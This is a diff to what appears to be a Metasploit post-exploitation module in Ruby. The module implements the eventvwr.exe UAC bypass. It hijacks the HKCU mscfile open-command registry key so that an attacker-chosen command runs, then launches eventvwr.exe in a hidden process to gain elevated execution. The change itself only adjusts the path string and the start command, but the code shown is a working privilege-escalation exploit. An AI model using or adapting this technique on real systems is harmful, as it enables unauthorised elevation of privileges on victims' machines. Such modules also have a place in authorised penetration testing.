@@ -149,9 +149,9 @@ def ls_stage1
 
   r=''
   session = client
+  vul_serve = 'eventvwr.exe'                                   # vulnerable soft to be hijacked
   exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
   comm_path = '%SystemRoot%\\System32\\cmd.exe /c'             # %comspec% path 
-  vul_serve = '%SystemRoot%\\System32\\eventvwr.exe'           # vulnerable soft to be hijacked
   regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
   comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
@@ -191,7 +191,7 @@ def ls_stage1
 
       # start remote service to gain code execution
       print_good(" Starting eventvwr.exe native proccess...")
-      r = session.sys.process.execute("cmd.exe /c #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
     # close channel when done
